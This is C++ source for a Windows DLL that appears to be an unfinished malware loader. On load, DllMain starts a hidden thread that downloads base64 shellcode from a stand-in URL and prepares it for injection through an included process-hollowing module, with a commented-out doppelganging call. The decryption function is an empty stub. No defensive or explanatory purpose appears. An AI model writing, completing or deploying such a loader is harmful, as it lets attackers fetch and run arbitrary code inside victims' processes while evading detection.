#define DEBUG

#include "include/include.h"
#include "include/print.h"
#include "include/injection/process_hallowing.h"

#ifdef DEBUG
#include "include/debug.h"
#endif

std::string DownloadShellcode() {
    HINTERNET hInternet = InternetOpen(reinterpret_cast<LPCSTR>("MyAgent"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET hConnect = InternetOpenUrl(hInternet, reinterpret_cast<LPCSTR>("https://example.com/shellcode.b64"), nullptr, 0, INTERNET_FLAG_SECURE, 0);

    char buffer[1024];
    DWORD bytesRead;
    std::string result;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        result.append(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}

std::vector<BYTE> DecryptShellcode(std::string &shellcode) {
}

void exec() {
    std::string downloadedShellCode = DownloadShellcode();
    if (downloadedShellCode.empty()) {
        Print("Failed to download shellcode, buffer empty", PRINT_ERROR);
        return;
    } else {
        Print("Downloaded shellcode", PRINT_DEBUG);
    }

    std::vector<BYTE> shellcode = DecryptShellcode(downloadedShellCode);
    // ProcessDoppel()
}

void run() {
    Print("Starting main thread", PRINT_INFO);
    std::thread runThread(exec);
    runThread.detach();
}

BOOL APIENTRY DllMain(  HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
#ifdef DEBUG
            RunConsole();
#endif
            run();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
#ifdef DEBUG
            StopConsole();
#endif
        break;
    }
    return TRUE;
}

